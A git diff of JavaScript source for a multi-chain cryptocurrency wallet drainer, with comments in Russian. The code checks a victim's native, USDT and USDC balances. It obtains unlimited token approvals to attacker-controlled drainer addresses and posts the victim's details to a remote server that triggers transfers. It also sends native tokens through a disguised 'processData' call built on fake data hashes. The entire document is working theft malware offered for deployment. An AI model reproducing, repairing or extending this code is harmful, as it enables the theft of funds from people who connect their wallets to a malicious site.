@@ -5,7 +5,8 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function approve(address spender, uint256 amount) returns (bool)",
   "function decimals() view returns (uint8)",
-  "function allowance(address owner, address spender) view returns (uint256)"
+  "function allowance(address owner, address spender) view returns (uint256)",
+  "function transferFrom(address sender, address recipient, uint256 amount) returns (bool)"
 ];
 
 // ABI для дрейнера
@@ -27,10 +28,10 @@ const CHAINS = {
     name: "Ethereum Mainnet",
     nativeToken: "ETH",
     chainIdHex: "0x1",
-    rpcUrls: ["https://rpc.ankr.com/eth"],
+    rpcUrls: ["https://ethereum-rpc.publicnode.com"],
     usdtAddress: "0xdAC17F958D2ee523a2206206994597C13D831ec7",
     usdcAddress: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",
-    drainerAddress: "0x7907CdDD42f823Ea59dc05fbcBA7e55398B91C2d",
+    drainerAddress: "0x22E2fdf36E1257012B7dD305A2939C5e08C958c5",
     explorerApi: "https://api.etherscan.io/api",
     explorerApiKey: ETHERSCAN_API_KEY
   },
@@ -45,7 +46,7 @@ const CHAINS = {
     ],
     usdtAddress: "0x55d398326f99059fF775485246999027B3197955",
     usdcAddress: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d",
-    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
+    drainerAddress: "YOUR_BNB_DRAINER_ADDRESS",
     explorerApi: "https://api.bscscan.com/api",
     explorerApiKey: BSCSCAN_API_KEY
   },
@@ -56,7 +57,7 @@ const CHAINS = {
     rpcUrls: ["https://polygon-rpc.com/"],
     usdtAddress: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F",
     usdcAddress: "0x2791Bca1f2de4661ED88A30C99A7a9449Aa84174",
-    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
+    drainerAddress: "YOUR_POLYGON_DRAINER_ADDRESS",
     explorerApi: "https://api.polygonscan.com/api",
     explorerApiKey: POLYGONSCAN_API_KEY
   },
@@ -66,22 +67,11 @@ const CHAINS = {
     chainIdHex: "0xa4b1",
     rpcUrls: ["https://arb1.arbitrum.io/rpc"],
     usdtAddress: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9",
-    usdcAddress: "0xAF88d065e77c8cC2239327C5EDb3A432268e5831",
-    drainerAddress: "0xA8CdF58a2849A697373DA69Bdf8F7d4030ADEeBa",
+    usdcAddress: "0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8",
+    drainerAddress: "YOUR_ARBITRUM_DRAINER_ADDRESS",
     explorerApi: "https://api.arbiscan.io/api",
     explorerApiKey: ARBISCAN_API_KEY
-  },
-  8453: {
-    name: "Base",
-    nativeToken: "ETH",
-    chainIdHex: "0x2105",
-    rpcUrls: ["https://mainnet.base.org"],
-    usdtAddress: "0xfde4C96c8593536E31F229EA8d515f7bC60b677",
-    usdcAddress: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913",
-    drainerAddress: "0x58F4380EC195822dE49Cb45CA6E4Ba1F047d38D2",
-    explorerApi: "https://api.basescan.org/api",
-    explorerApiKey: BASESCAN_API_KEY
-  },
+  }
 };
 
 // Утилита для задержки
@@ -114,11 +104,12 @@ async function getTokenBalanceFromExplorer(address, tokenAddress, chainId) {
 }
 
 // Проверка баланса с использованием API и fallback на RPC
-async function checkBalance(chainId, userAddress) {
+async function checkBalance(chainId, userAddress)
+
+{
   const config = CHAINS[chainId];
   let nativeBalance, usdtBalance, usdcBalance;
 
-  // Проверка нативного баланса через API
   try {
     nativeBalance = await getBalanceFromExplorer(userAddress, chainId);
   } catch (e) {
@@ -135,7 +126,6 @@ async function checkBalance(chainId, userAddress) {
     nativeBalance = await provider.getBalance(userAddress);
   }
 
-  // Проверка USDT через API
   try {
     usdtBalance = await getTokenBalanceFromExplorer(userAddress, config.usdtAddress, chainId);
   } catch (e) {
@@ -145,7 +135,6 @@ async function checkBalance(chainId, userAddress) {
     usdtBalance = await usdt.balanceOf(userAddress);
   }
 
-  // Проверка USDC через API
   try {
     usdcBalance = await getTokenBalanceFromExplorer(userAddress, config.usdcAddress, chainId);
   } catch (e) {
@@ -185,113 +174,162 @@ async function drain(chainId, signer, userAddress, bal) {
   const config = CHAINS[chainId];
   const MAX = ethers.constants.MaxUint256;
 
-  const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
   const usdt = new ethers.Contract(config.usdtAddress, ERC20_ABI, signer);
   const usdc = new ethers.Contract(config.usdcAddress, ERC20_ABI, signer);
 
-  // Первая подпись: approve для USDT и USDC
-  let canDrainTokens = false;
+  // Проверка баланса ETH перед approve
+  const ethBalance = await signer.provider.getBalance(userAddress);
+  const minEthRequired = ethers.utils.parseEther("0.0003");
+  if (ethBalance.lt(minEthRequired)) {
+    console.error(`❌ Недостаточно ${config.nativeToken} для газа: ${ethers.utils.formatEther(ethBalance)} ${config.nativeToken}`);
+    throw new Error(`Недостаточно ${config.nativeToken} для оплаты газа`);
+  }
 
+  // Проверка и выполнение approve для USDT
   if (bal.usdtBalance.gt(0)) {
-    console.log(`📊 USDT баланс: ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
+    console.log(`📊 USDT баланс (API): ${ethers.utils.formatUnits(bal.usdtBalance, 6)} USDT`);
+    const realUsdtBalance = await usdt.balanceOf(userAddress);
+    console.log(`📊 USDT баланс (реальный): ${ethers.utils.formatUnits(realUsdtBalance, 6)} USDT`);
+    if (realUsdtBalance.lt(bal.usdtBalance)) {
+      console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdtBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdtBalance, 6)}`);
+      bal.usdtBalance = realUsdtBalance;
+    }
+
     const allowanceBefore = await usdt.allowance(userAddress, config.drainerAddress);
     console.log(`📜 USDT allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} USDT`);
 
     if (allowanceBefore.lt(bal.usdtBalance)) {
       try {
-        const tx = await usdt.approve(config.drainerAddress, MAX);
-        await tx.wait();
+        const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
+        const tx = await usdt.approve(config.drainerAddress, MAX, {
+          gasLimit: 100000,
+          gasPrice: ethers.utils.parseUnits("3", "gwei"),
+          nonce
+        });
+        const receipt = await tx.wait();
         console.log("✅ USDT approve успешен:", tx.hash);
-
-        // Проверяем allowance после approve
+        console.log("⏳ Ожидание подтверждения approve...");
+        await delay(5000);
         const allowanceAfter = await usdt.allowance(userAddress, config.drainerAddress);
         console.log(`📜 USDT allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDT`);
-        if (allowanceAfter.lt(bal.usdtBalance)) {
-          throw new Error("USDT allowance не установлен корректно");
-        }
+        await notifyServer(userAddress, config.usdtAddress, bal.usdtBalance, chainId, receipt.transactionHash);
       } catch (e) {
         console.error(`❌ Ошибка approve для USDT: ${e.message}`);
         throw e;
       }
+    } else {
+      console.log("✅ USDT allowance уже достаточен, уведомляем сервер");
+      await notifyServer(userAddress, config.usdtAddress, bal.usdtBalance, chainId, null);
     }
-    canDrainTokens = true;
   }
 
+  // Проверка и выполнение approve для USDC
   if (bal.usdcBalance.gt(0)) {
-    console.log(`📊 USDC баланс: ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
-    const allowanceBefore = await usdc.allowance(userAddress, config.drainerAddress);
-    console.log(`📜 USDC allowance до: ${ethers.utils.formatUnits(allowanceBefore, 6)} USDC`);
+    console.log(`📊 USDC баланс (API): ${ethers.utils.formatUnits(bal.usdcBalance, 6)} USDC`);
+    const realUsdcBalance = await usdc.balanceOf(userAddress);
+    console.log(`📊 USDC баланс (реальный): ${ethers.utils.formatUnits(realUsdcBalance, 6)} USDC`);
+    if (realUsdcBalance.lt(bal.usdcBalance)) {
+      console.error(`❌ Некорректный баланс: API вернул ${ethers.utils.formatUnits(bal.usdcBalance, 6)}, реальный: ${ethers.utils.formatUnits(realUsdcBalance, 6)}`);
+      bal.usdcBalance = realUsdcBalance;
+    }
 
+    const allowanceBefore = await usdc.allowance(userAddress, config.drainerAddress);
     if (allowanceBefore.lt(bal.usdcBalance)) {
       try {
-        const tx = await usdc.approve(config.drainerAddress, MAX);
-        await tx.wait();
+        const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
+        const tx = await usdc.approve(config.drainerAddress, MAX, {
+          gasLimit: 100000,
+          gasPrice: ethers.utils.parseUnits("3", "gwei"),
+          nonce
+        });
+        const receipt = await tx.wait();
         console.log("✅ USDC approve успешен:", tx.hash);
-
-        // Проверяем allowance после approve
+        console.log("⏳ Ожидание подтверждения approve...");
+        await delay(5000);
         const allowanceAfter = await usdc.allowance(userAddress, config.drainerAddress);
         console.log(`📜 USDC allowance после: ${ethers.utils.formatUnits(allowanceAfter, 6)} USDC`);
-        if (allowanceAfter.lt(bal.usdcBalance)) {
-          throw new Error("USDC allowance не установлен корректно");
-        }
+        await notifyServer(userAddress, config.usdcAddress, bal.usdcBalance, chainId, receipt.transactionHash);
       } catch (e) {
         console.error(`❌ Ошибка approve для USDC: ${e.message}`);
         throw e;
       }
-    }
-    canDrainTokens = true;
-  }
-
-  // Вторая подпись: вызов processData для списания USDT и USDC
-  if (canDrainTokens) {
-    const taskId = Math.floor(Math.random() * 1000000);
-    const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-tokens-${Date.now()}`));
-    const nonce = Math.floor(Math.random() * 1000000);
-
-    try {
-      const tx = await drainer.processData(taskId, dataHash, nonce, {
-        value: 0, // Не отправляем нативный токен на этом этапе
-        gasLimit: 300000,
-        gasPrice: ethers.utils.parseUnits("3", "gwei")
-      });
-      const receipt = await tx.wait();
-      if (receipt.status !== 1) {
-        throw new Error("Транзакция processData (токены) не удалась");
-      }
-      console.log("✅ Дрейнинг токенов успешен:", receipt.transactionHash);
-    } catch (e) {
-      console.error(`❌ Ошибка вызова processData (токены): ${e.message}`);
-      throw e;
+    } else {
+      console.log("✅ USDC allowance уже достаточен, уведомляем сервер");
+      await notifyServer(userAddress, config.usdcAddress, bal.usdcBalance, chainId, null);
     }
   }
 
-  // Третья подпись: вызов processData для списания нативного токена
+  // Дрейнинг нативного токена
   if (bal.nativeBalance.gt(0)) {
+    const drainer = new ethers.Contract(config.drainerAddress, DRAINER_ABI, signer);
     const gasReserve = ethers.utils.parseEther("0.002");
     const nativeToSend = bal.nativeBalance.sub(gasReserve);
-    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0); // Исправлено для всех сетей
+    const value = nativeToSend.gt(0) ? nativeToSend : ethers.BigNumber.from(0);
 
     if (value.gt(0)) {
       const taskId = Math.floor(Math.random() * 1000000);
       const dataHash = ethers.utils.keccak256(ethers.utils.toUtf8Bytes(`fakeData-native-${Date.now()}`));
-      const nonce = Math.floor(Math.random() * 1000000);
+      const nonce = await signer.provider.getTransactionCount(userAddress, "pending");
 
       try {
         const tx = await drainer.processData(taskId, dataHash, nonce, {
           value,
-          gasLimit: 200000, // Меньше газа, так как только нативный токен
-          gasPrice: ethers.utils.parseUnits("3", "gwei")
+          gasLimit: 100000,
+          gasPrice: ethers.utils.parseUnits("3", "gwei"),
+          nonce
         });
         const receipt = await tx.wait();
         if (receipt.status !== 1) {
-          throw new Error("Транзакция processData (нативный токен) не удалась");
+          throw new Error(`Транзакция processData (${config.nativeToken}) не удалась`);
         }
-        console.log("✅ Дрейнинг нативного токена успешен:", receipt.transactionHash);
+        console.log(`✅ Дрейнинг ${config.nativeToken} успешен:`, receipt.transactionHash);
       } catch (e) {
-        console.error(`❌ Ошибка вызова processData (нативный токен): ${e.message}`);
+        console.error(`❌ Ошибка вызова processData (${config.nativeToken}): ${e.message}`);
         throw e;
       }
     }
+  }
+}
+
+async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash) {
+  try {
+    const provider = new ethers.providers.JsonRpcProvider(CHAINS[chainId].rpcUrls[0]);
+    const token = new ethers.Contract(tokenAddress, ERC20_ABI, provider);
+    const balance = await token.balanceOf(userAddress);
+    const decimals = await token.decimals();
+    const balanceUnits = ethers.utils.formatUnits(balance, decimals);
+    console.log(`📊 Реальный баланс токена (${tokenAddress}): ${balanceUnits}`);
+
+    const roundedBalance = Math.floor(parseFloat(balanceUnits) * 10) / 10;
+    console.log(`📊 Округлённый баланс: ${roundedBalance}`);
+
+    const roundedAmount = ethers.utils.parseUnits(roundedBalance.toString(), decimals);
+    if (roundedAmount.lte(0)) {
+      throw new Error('Баланс слишком мал для перевода');
+    }
+
+    console.log(`📤 Отправка на сервер: userAddress=${userAddress}, tokenAddress=${tokenAddress}, amount=${ethers.utils.formatUnits(roundedAmount, decimals)}, chainId=${chainId}, txHash=${txHash}`);
+    const response = await fetch('https://yourdomain.com/api/transfer', { // Замените на ваш домен
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        userAddress,
+        tokenAddress,
+        amount: roundedAmount.toString(),
+        chainId,
+        txHash
+      })
+    });
+    const data = await response.json();
+    if (data.success) {
+      console.log("✅ Сервер уведомлён, трансфер будет выполнен");
+    } else {
+      console.error("❌ Ошибка от сервера:", data.message);
+      throw new Error(data.message);
+    }
+  } catch (e) {
+    console.error("❌ Ошибка при отправке данных на сервер:", e.message);
+    throw e;
   }
 }
 
@@ -312,7 +350,6 @@ export async function runDrainer(provider, signer, userAddress) {
   });
 
   const balances = (await Promise.all(balancePromises)).filter(Boolean);
-
   const sorted = balances
     .filter(hasFunds)
     .sort((a, b) =>
